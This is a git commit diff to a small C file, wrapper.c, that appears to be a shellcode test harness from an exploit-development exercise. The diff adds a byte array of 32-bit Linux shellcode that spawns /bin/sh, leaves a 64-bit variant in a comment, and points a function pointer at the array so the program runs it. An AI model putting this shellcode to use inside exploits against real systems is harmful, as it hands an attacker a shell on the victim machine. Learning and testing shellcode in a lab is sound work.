3953434c919ed8607ba56a234b9690ab75a252f1
Loïc Gavens <loic.2010@live.fr>
2023-01-11 17:14:31 +0100

    working

--- wrapper/wrapper.c
+++ wrapper/wrapper.c
@@ -2,19 +2,19 @@
 #include <string.h>
 #include <unistd.h>
 
-//        "\x48\x31\xf6\x56\x48\xbf"
-//        "\x2f\x62\x69\x6e\x2f"
-//        "\x2f\x73\x68\x57\x54"
-//        "\x5f\xb0\x3b\x99\x0f\x05";
+//  \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54
+unsigned char code[] =
+        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
 
-int main(int argc, char *argv[]){
+int main(int argc,  char *argv[]){
 
     printf("Longueur shellcode %d\n", (int)strlen(code));
 
 //    unsigned char code = argv[1];
 //    unsigned char code[] = testvar;
 
-    int (*ret)() = (int(*)())argv;
+    int (*ret)() = (int(*)())code;
 
     ret();
 //
